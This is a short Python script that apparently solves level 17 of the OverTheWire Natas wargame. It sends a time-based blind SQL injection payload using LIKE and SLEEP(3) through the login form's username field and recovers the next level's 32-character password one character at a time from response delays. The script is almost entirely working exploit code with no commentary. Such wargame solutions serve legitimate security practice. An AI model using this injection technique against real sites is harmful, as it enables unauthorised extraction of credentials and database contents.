import requests
import string
import sys
import time
import math
valid_chars = string.digits + string.ascii_letters
auth_pass = sys.argv[1]
password = ""


def measure_response_time(p_ch):
    payload = {'username':f'natas18" AND BINARY password LIKE \'{password}{p_ch}%\' AND SLEEP(3) #'}
    start_time = time.perf_counter()
    requests.post(
        'http://natas17.natas.labs.overthewire.org/index.php', 
        auth=('natas17', auth_pass),
        data=payload
    )
    end_time = time.perf_counter()
    return end_time - start_time


while len(password) < 32:
    for ch in valid_chars:
        if measure_response_time(ch) >= 3:
            password += ch
            break
    print(password)

print(f"Finish! the password is {password}")
